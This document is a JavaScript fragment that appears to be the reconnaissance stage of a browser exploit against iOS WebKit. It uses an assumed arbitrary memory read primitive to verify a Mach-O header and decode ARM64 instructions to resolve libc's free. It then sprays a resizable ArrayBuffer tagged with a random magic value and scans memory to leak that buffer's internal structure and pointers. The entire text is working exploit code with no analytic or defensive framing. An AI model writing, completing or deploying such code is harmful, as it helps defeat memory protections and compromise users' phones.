/* ===== iOS 27 recon: resolve free + find resizable ArrayBuffer struct ===== */
  function u64(x) { return BigInt.asUintN(64, x); }
  function rd32_(A) {
    var a = A & ~7n;
    var q = u64(RD(a));
    var sh = Number(A & 7n) * 8;
    return Number((q >> BigInt(sh)) & 0xffffffffn);
  }
  function put64_(arr, off, val) {
    var v = u64(val);
    for (var i = 0; i < 8; i++) arr[off + i] = Number((v >> BigInt(i * 8)) & 0xffn);
  }
  var base = 0n;
  if (CFG.JS_DEF_FREE) {
    base = u64(js_free - BigInt(CFG.JS_DEF_FREE));
    if ((rd32_(base) >>> 0) !== 0xfeedfacf) base = 0n;
  }
  if (base === 0n) { setres('R_NO_BASE'); return; }
  var libcFree = 0n;
  if (rd32_(js_free) === 0xaa0103e0) {
    var br = rd32_(js_free + 4n);
    if (((br & 0xfc000000) >>> 0) === 0x14000000) {
      var im = br & 0x03ffffff;
      if (im & 0x02000000) im -= 0x04000000;
      var plt = js_free + 4n + BigInt(im) * 4n;
      var ad = rd32_(plt);
      if (((ad & 0x9f000000) >>> 0) === 0x90000000) {
        var ml = (ad >>> 29) & 3, mh = (ad >>> 5) & 0x7ffff;
        var ai = (mh << 2) | ml;
        if (ai & 0x100000) ai -= 0x200000;
        var pg = (plt & ~0xfffn) + BigInt(ai) * 4096n;
        var ld = rd32_(plt + 4n);
        if (((ld & 0xffc00000) >>> 0) === 0xf9400000) {
          var g2 = RD(pg + BigInt((ld >>> 10) & 0xfff) * 8n);
          if (codeok(g2)) libcFree = g2;
        }
      }
    }
  }
  if (libcFree === 0n) { setres('R_NO_FREE'); return; }

  var CHUNK = 4194304n;
  var RAB = new ArrayBuffer(4096, { maxByteLength: Number(CHUNK) });
  var UB = new Uint8Array(RAB);
  globalThis.__RABKEEP = [RAB, UB];
  for (var i0 = 0; i0 < 4096; i0++) UB[i0] = 0;
  var MAG = (BigInt((Math.random() * 0x100000000) >>> 0) << 32n) |
            BigInt((Math.random() * 0x100000000) >>> 0);
  if (MAG === 0n) MAG = 0x5a5a5a5a5a5a5a5an;
  put64_(UB, 0x800, MAG);

  var U = 0n, S = 0n, lim = 0x10000n, off;
  for (off = D; off < D + lim; off += 8n) {
    var w = RD(off);
    if ((w & 0xffffffffn) === 4096n) {
      var p = RD(off + 16n);
      var pq = p & 0x00ffffffffffffffn;
      if (pq > 0x10000n && pq < 0x0001000000000000n && (p & 7n) === 0n) {
        try { if (RD(p + 0x800n) === MAG) { U = p; S = off; break; } } catch (e) {}
      }
    }
  }
  if (U === 0n) {
    for (off = D - 8n; off > D - lim; off -= 8n) {
      var w2 = RD(off);
      if ((w2 & 0xffffffffn) === 4096n) {
        var p2 = RD(off + 16n);
        var pq2 = p2 & 0x00ffffffffffffffn;
        if (pq2 > 0x10000n && pq2 < 0x0001000000000000n && (p2 & 7n) === 0n) {
          try { if (RD(p2 + 0x800n) === MAG) { U = p2; S = off; break; } } catch (e) {}
        }
      }
    }
  }
  if (U === 0n) { setres('R_NF D=' + hex(D)); return; }
  var bl = RD(S);
  var mx = RD(S + 4n);
  var rf = RD(S + 0x28n);
  setres('R_OK F=' + hex(libcFree) + ' S=' + hex(S) + ' U=' + hex(U) +
         ' BL=' + hex(bl) + ' MX=' + hex(mx) + ' RF=' + hex(rf));
